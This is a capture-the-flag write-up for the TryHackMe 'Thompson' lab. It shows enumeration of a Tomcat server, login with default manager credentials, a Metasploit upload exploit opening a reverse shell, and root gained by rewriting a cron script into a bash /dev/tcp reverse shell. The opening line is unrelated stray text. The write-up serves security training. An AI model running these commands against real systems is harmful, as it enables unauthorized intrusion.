Floats the panel, if there is a window nearby or maximised, it defloats.# Enumeration
## Ping scan
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ ping 10.10.215.147     
PING 10.10.215.147 (10.10.215.147) 56(84) bytes of data.
64 bytes from 10.10.215.147: icmp_seq=1 ttl=63 time=54.7 ms
64 bytes from 10.10.215.147: icmp_seq=2 ttl=63 time=54.6 ms
^C
--- 10.10.215.147 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 54.589/54.648/54.707/0.059 ms
```
### Notes
Host is up
## Nmap scan
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ sudo nmap -A -p- -oN nmap_results.txt 10.10.215.147
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 22:04 EET
Nmap scan report for 10.10.215.147
Host is up (0.054s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc052481987eb8db0592a6e78eb02111 (RSA)
|   256 60c840abb009843d46646113fabc1fbe (ECDSA)
|_  256 b5527e9c019b980c73592035ee23f1a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/7%OT=22%CT=1%CU=34179%PV=Y%DS=2%DC=T%G=Y%TM=636964E
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   54.35 ms 10.11.0.1
2   54.38 ms 10.10.215.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.84 seconds
```
### Notes:
- ssh on port 22
- ajp13 on port 8009 Apache Jserv
- http on port 8080
##  http://10.10.215.147:8080/
```html
Apache Tomcat/8.5.5 default webpage
```
## dir enum
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ gobuster dir -u http://10.10.215.147:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -o gobuster_results_big.txt -x txt,php,html,js -t 20
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```
### Notes:
- `/manager` seems interesting
- visiting `/manager` shows a login prompt
- testing with U: `admin` P: `admin` returns 404 error page with the default creds.
- entered the default creds U: `tomcat` and P: `s3cret` 
- Accessed the manager page.
- ![[Pasted image 20221107222520.png]]
## dir enum /manager
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ gobuster dir -u http://10.10.215.147:8080/manager -w /usr/share/seclists/Discovery/Web-Content/big.txt -c "5D5797098BBB4760F37D792C1286156B" -q -o gobuster_results_big_cookies.txt -x txt,php,html,js -t 20 
/html                 (Status: 401) [Size: 2473]
/images               (Status: 302) [Size: 0] [--> /manager/images/]
/status               (Status: 401) [Size: 2473]
/text                 (Status: 401) [Size: 2473]
```
### Notes:
- I've supplied my cookie `-c "5D5797098BBB4760F37D792C1286156B"`
# Weaponization
## Searchsploit
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ searchsploit tomcat 8.5.5
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47  | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47  | windows/webapps/42953.txt
---------------------------------------------------- ---------------------------------
Shellcodes: No Results
sami@bt:~/Documents/THM/CTFs/Thompson$ python3 42966.py -u http://10.10.215.147:8080



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/



[@intx0x80]


Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```
### Notes: 
- Not vulnerable to CVE-2017-12617
## metasploit
```sh
sami@bt:~/Documents/THM/CTFs/Thompson$ msfconsole     
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.2.25-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search tomcat upload

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank       Check  Description
   -  ----                                                         ---------------  ----       -----  -----------
	...
   3  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
	...

Interact with a module by name or index. For example info 9, use 9 or use exploit/multi/http/tomcat_jsp_upload_bypass

msf6 > use 3
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,t
                                            ype:host:port][...]
   RHOSTS                         yes       The target host(s), see https://github.co
                                            m/rapid7/metasploit-framework/wiki/Using-
                                            Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connection
                                            s
   TARGETURI     /manager         yes       The URI path of the manager app (/html/up
                                            load and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specifie
                                     d)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
HttpPassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOST 10.10.215.147
RHOST => 10.10.215.147
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.11.4.14
LHOST => 10.11.4.14
msf6 exploit(multi/http/tomcat_mgr_upload) > set LPORT 1234
LPORT => 1234


msf6 exploit(multi/http/tomcat_mgr_upload) > show payloads

Compatible Payloads
===================

   #   Name                                     Disclosure Date  Rank    Check  Description
   -   ----                                     ---------------  ----    -----  -----------
   0   payload/generic/custom                                    normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                            normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                         normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                              normal  No     Interact with Established SSH Connection
   4   payload/java/jsp_shell_bind_tcp                           normal  No     Java JSP Command Shell, Bind TCP Inline
   5   payload/java/jsp_shell_reverse_tcp                        normal  No     Java JSP Command Shell, Reverse TCP Inline
   6   payload/java/meterpreter/bind_tcp                         normal  No     Java Meterpreter, Java Bind TCP Stager
   7   payload/java/meterpreter/reverse_http                     normal  No     Java Meterpreter, Java Reverse HTTP Stager
   8   payload/java/meterpreter/reverse_https                    normal  No     Java Meterpreter, Java Reverse HTTPS Stager
   9   payload/java/meterpreter/reverse_tcp                      normal  No     Java Meterpreter, Java Reverse TCP Stager
   10  payload/java/shell/bind_tcp                               normal  No     Command Shell, Java Bind TCP Stager
   11  payload/java/shell/reverse_tcp                            normal  No     Command Shell, Java Reverse TCP Stager
   12  payload/java/shell_reverse_tcp                            normal  No     Java Command Shell, Reverse TCP Inline
   13  payload/multi/meterpreter/reverse_http                    normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   14  payload/multi/meterpreter/reverse_https                   normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)

msf6 exploit(multi/http/tomcat_mgr_upload) > set payload payload/java/shell/reverse_tcppayload => java/shell/reverse_tcp

msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  s3cret           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,t
                                            ype:host:port][...]
   RHOSTS        10.10.215.147    yes       The target host(s), see https://github.co
                                            m/rapid7/metasploit-framework/wiki/Using-
                                            Metasploit
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connection
                                            s
   TARGETURI     /manager         yes       The URI path of the manager app (/html/up
                                            load and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.11.4.14       yes       The listen address (an interface may be specifie
                                     d)
   LPORT  1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
```
## Exploitation
```
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.11.4.14:1234 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying EphJp...
[*] Executing EphJp...
[*] Undeploying EphJp ...
[*] Sending stage (2952 bytes) to 10.10.215.147
[*] Undeployed at /manager/html/undeploy
[*] Command shell session 1 opened (10.11.4.14:1234 -> 10.10.215.147:33442) at 2022-11-07 23:03:05 +0200

whoami
tomcat
```
# Post-Exploit Enum
```sh
cd /tmp
ls
hsperfdata_tomcat
systemd-private-3f2f1766ef804f6ab7a165f246e44cdf-systemd-timesyncd.service-SbZ0vR
VMwareDnD
wget http://10.11.4.14:8001/linpeas.sh      
--2022-11-07 13:10:29--  http://10.11.4.14:8001/linpeas.sh
Connecting to 10.11.4.14:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 764159 (746K) [text/x-sh]
Saving to: ‘linpeas.sh’

2022-11-07 13:10:30 (1.12 MB/s) - ‘linpeas.sh’ saved [764159/764159]

chmod +x linpeas.sh
./linpeas.sh
``` 
### linpeas.sh results:
- ╔══════════╣ Cron jobs
	- `*  *	* * *	root	cd /home/jack && bash id.sh`
# Privileges Escalation
```sh
cd /home/jack
ls
id.sh
test.txt
user.txt
cat id.sh
#!/bin/bash
id > test.txt
ls -hla
total 48K
drwxr-xr-x 4 jack jack 4.0K Aug 23  2019 .
drwxr-xr-x 3 root root 4.0K Aug 14  2019 ..
-rw------- 1 root root 1.5K Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3.7K Aug 14  2019 .bashrc
drwx------ 2 jack jack 4.0K Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4.0K Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Nov  7 13:17 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
echo "#!/bin/bash" > id.sh && echo "bash -i >& /dev/tcp/10.11.4.14/1337 0>&1" >> id.sh
cat id.sh
#!/bin/bash
bash -i >& /dev/tcp/10.11.4.14/1337 0>&1
```
### Notes:
- the original id.sh script was manipulated and changed to a [[bash reverse shell]] pointing to my ip
- successfully obtained the reverse-shell on port 1337
# Rooting
```sh
sami@bt:~/Documents/THM/Rooms/WebOSINT$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.11.4.14] from (UNKNOWN) [10.10.215.147] 40002
bash: cannot set terminal process group (15834): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# whoami
whoami
root
root@ubuntu:/home/jack# find / -type f -name root.txt 2>/dev/null
find / -type f -name root.txt 2>/dev/null
/root/root.txt
```
# Done